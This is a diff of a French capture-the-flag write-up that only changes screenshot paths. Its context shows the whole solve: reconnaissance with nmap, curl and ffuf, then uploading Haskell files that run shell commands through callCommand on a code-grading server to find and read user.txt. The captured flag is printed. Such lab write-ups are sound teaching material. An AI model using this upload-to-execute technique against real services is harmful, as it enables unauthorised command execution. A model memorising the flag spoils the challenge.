@@ -10,13 +10,13 @@ Catégorie : Injection
 nmap 10.10.0.36
 ```
 
-![nmap](./screenshots/fun_with_functional_nmap.png)
+![nmap](./screenshots/fun_with_functional/nmap.png)
 
 ```bash
 curl http://10.10.0.36:5001/
 ```
 
-![curl](./screenshots/fun_with_functional_curl.png)
+![curl](./screenshots/fun_with_functional/curl.png)
 
 La page fait explicitement référence à Haskell, un langage de programmation. Et on voit un dossier ou fichier /homework.
 
@@ -34,7 +34,7 @@ ffuf -u http://10.10.0.36:5001/homework/FUZZ -w /usr/share/wordlists/seclists/Di
 
 Aucun résultat. Ce qui veut dire que /homework n'est donc pas un dossier avec plusieurs pages, mais une page unique.
 
-![Résultat ffuf](./screenshots/fun_with_functional_ffuf.png)
+![Résultat ffuf](./screenshots/fun_with_functional/ffuf.png)
 
 ## 3. Découverte du formulaire d'upload
 
@@ -42,7 +42,7 @@ Aucun résultat. Ce qui veut dire que /homework n'est donc pas un dossier avec p
 curl http://10.10.0.36:5001/homework
 ```
 
-![Résultat curl](./screenshots/fun_with_functional_curl2.png)
+![Résultat curl](./screenshots/fun_with_functional/curl2.png)
 
 La page demande d'envoyer un fichier .hs via un formulaire d'upload. Le texte précise qu'un "outil d'autocorrection" va traiter ce fichier. Cette phrase est un indique que si le serveur traite réellement le code envoyé, il y a de bonnes chances qu'il le compile et l'exécute, ce qui permettrait d'exécuter n'importe quelle commande à sa place.
 
@@ -64,7 +64,7 @@ main = putStrLn "I love Haskell"
 curl -F "file=@test.hs" http://10.10.0.36:5001/homework
 ```
 
-![Résultat curl test](./screenshots/fun_with_functional_curl3.png)
+![Résultat curl test](./screenshots/fun_with_functional/curl3.png)
 
 -F sert à envoyer le fichier au format multipart/form-data, exactement le format attendu par le champ <input type=file name=file> du formulaire.
 
@@ -74,7 +74,7 @@ La réponse était une redirection HTTP (302) vers /uploads/test.hs. Par défaut
 curl -L -F "file=@test.hs" http://10.10.0.36:5001/homework
 ```
 
-![Résultat curl test 2](./screenshots/fun_with_functional_curl4.png)
+![Résultat curl test 2](./screenshots/fun_with_functional/curl4.png)
 
 Le serveur compile réellement mon fichier et exécute le programme obtenu, puis renvoie ce que le programme affiche, c'est une faille qu'on peut exploité.
 
@@ -115,7 +115,7 @@ main = callCommand "find /home -name user.txt"
 curl -L -F "file=@find.hs" http://10.10.0.36:5001/homework
 ```
 
-![Résultat du find](./screenshots/fun_with_functional_curl4.png)
+![Résultat du find](./screenshots/fun_with_functional/find.png)
 
 Le fichier user.txt a été localisé.
 
@@ -139,7 +139,7 @@ main = callCommand "cat /home/prof/user.txt"
 curl -L -F "file=@flag.hs" http://10.10.0.41:5001/homework
 ```
 
-![Flag](./screenshots/fun_with_functional_flag.png)
+![Flag](./screenshots/fun_with_functional/flag.png)
 
 **Flag : EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}**
 
